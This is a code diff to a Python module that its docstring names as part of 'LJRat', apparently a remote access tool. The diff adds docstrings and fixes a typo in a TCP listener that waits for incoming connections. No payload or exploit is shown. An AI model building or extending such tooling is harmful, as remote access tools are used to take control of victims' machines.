@@ -1,3 +1,7 @@
+"""
+LJRat module that adds the listen function to the lp core
+"""
+
 from globals import ctx
 from context import State
 from error import SYNTAX_TABLE, E_LISTEN_ERROR
@@ -6,7 +10,11 @@ import sys
 import select
 import worker
 
+
 def entrypoint(self, args):
+    """Listen on a specified ip/port
+    'listen [target_name] [ip] [port]'
+        """
     args = args.split()
 
     args = validator(args)
@@ -14,7 +22,7 @@ def entrypoint(self, args):
         return None
     
 
-    print(f"Waitng for connection on {args[1]}:{args[2]}")
+    print(f"Waiting for connection on {args[1]}:{args[2]}")
     listen_sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
     listen_sock.bind((args[1], int(args[2])))
     listen_sock.listen(5)
@@ -49,6 +57,7 @@ def entrypoint(self, args):
     return
 
 def validator(args):
+    '''Checks to make sure listen command is supplied the right arguments'''
     args = args
     if len(args) != 3:
         print(SYNTAX_TABLE[E_LISTEN_ERROR])
